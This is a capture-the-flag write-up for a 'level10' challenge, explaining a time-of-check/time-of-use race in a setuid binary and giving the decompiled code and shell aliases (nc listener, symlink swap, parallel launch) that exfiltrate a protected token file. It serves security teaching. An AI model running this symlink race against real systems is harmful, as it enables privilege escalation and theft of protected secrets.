In the home directory, there is a program named 'level10' and a file named 'token.'

```bash
-rwsr-sr-x+ 1 flag10 level10 10817 Mar 5 2016 level10
-rw------- 1 flag10 flag10 26 Mar 5 2016 token
```

The user level10 is unable to read 'token,' and the program has a setuid to flag10.

In the binary of the file, we can see:

- Test the access to the file:

```c
pcVar6 = in_stack_00000008[1];
param1 = in_stack_00000008[2];
iVar2 = access(in_stack_00000008[1], 4);
```

- Then connect to the address:

```c
local_24.sa_data._2_4_ = inet_addr(param1);
uVar1 = htons(0x1b39);
local_24.sa_data._0_2_ = uVar1;
iVar3 = connect(iVar2, &local_24, 0x10);
```

- And finally open the file:

```c
iVar3 = open(pcVar6, 0);
if (iVar3 == -1) {
  puts("Damn. Unable to open file");
  /* WARNING: Subroutine does not return */
  exit(1);
}
__n = read(iVar3, local_1024, 0x1000);
```

The offset between the verification of the read-write and the opening of the file allows us
the time to change the file to open another file than the one verified.

To solve this exercise, I used several commands to achieve the race condition:

First, I need to listen at port 6969:

```bash
alias listen="nc -l 6969"
```

Then I need to set a link to a file that can be read by the level10 user:

```bash
alias reset="touch /tmp/dummy ; ln -sf /tmp/dummy /tmp/link"
```

I need to start the program 'level10' to send the value of 'token' to 127.0.0.1:

```bash
alias send="./level10 /tmp/link 127.0.0.1"
```

And I need to change the file that is linked by /tmp/link between the verification and the open:

```bash
alias race="ln -sf token /tmp/link"
```

The final command combines everything and executes parallel 'listen,' 'send,' and 'race':

```bash
listen & reset ; send & race
```